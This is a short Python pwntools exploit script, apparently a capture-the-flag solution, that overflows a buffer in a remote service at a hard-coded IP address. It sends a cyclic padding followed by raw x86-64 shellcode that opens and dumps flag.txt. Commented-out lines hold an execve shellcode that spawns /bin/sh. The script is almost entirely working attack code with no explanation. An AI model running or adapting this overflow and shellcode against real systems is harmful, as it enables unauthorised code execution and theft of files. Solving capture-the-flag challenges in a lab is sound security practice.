from pwn import *
context.binary='./challenge'
#p = process()
p = remote('34.126.117.161',3000)
script = """
b*main+147
c
"""
#p = gdb.debug('./challenge',script)
payload = cyclic(0x141) 
payload += b'\x48\x31\xDB\x48\xBB\x66\x6C\x61\x67\x2E\x74\x78\x74\x6A\x00\x53\x48\x31\xDB\x48\xBB\x2E\x2F\x2F\x2F\x2F\x2F\x2F\x2F\x53\x48\x89\xE7\x48\x31\xF6\x48\x31\xD2\x48\x31\xC0\xB0\x02\x0F\x05\x48\x31\xFF\x48\x83\xC7\x01\x89\xC6\x48\x31\xD2\x4D\x31\xD2\x49\xC7\xC2\x00\x10\x00\x00\x48\x31\xC0\xB0\x28\x0F\x05'
#+b'\x48\x31\xDB\x48\xBB\x66\x6C\x61\x67\x2E\x74\x78\x74\x6A\x00\x53\x48\x31\xDB\x48\xBB\x2E\x2F\x2F\x2F\x2F\x2F\x2F\x2F\x53\x48\x89\xE7\x48\x31\xF6\x48\x31\xD2\x48\x31\xC0\xB0\x02\x0F\x05'
#+ b'\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05'
p.sendline(payload)
p.interactive()
